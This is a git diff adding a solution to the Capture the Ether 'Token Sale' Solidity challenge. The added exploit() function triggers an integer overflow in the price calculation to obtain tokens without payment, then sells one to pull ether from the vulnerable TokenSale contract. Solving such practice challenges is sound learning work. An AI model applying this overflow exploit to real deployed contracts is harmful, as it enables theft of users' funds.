@@ -1,6 +1,6 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
-
+import "forge-std/Test.sol";
 contract TokenSale {
     mapping(address => uint256) public balanceOf;
     uint256 constant PRICE_PER_TOKEN = 1 ether;
@@ -40,7 +40,18 @@ contract ExploitContract {
     constructor(TokenSale _tokenSale) {
         tokenSale = _tokenSale;
     }
+    //https://ethereum.stackexchange.com/questions/131516/integer-overflow-not-ocurring-as-expected-in-capture-the-ether-token-sale-challe/131705#131705
+    // write your exploit functions below
+     function exploit () public payable {
+        uint256 number; 
+        unchecked {
+            //number = ( (((type(uint256).max))) - (10**18) ) * 1 ether;
+            number = uint(2**238);
+        }
+        console.log(2**238);
+        tokenSale.buy{value: 0 ether}(number);
+        tokenSale.sell(1);
+     }
 
     receive() external payable {}
-    // write your exploit functions below
 }
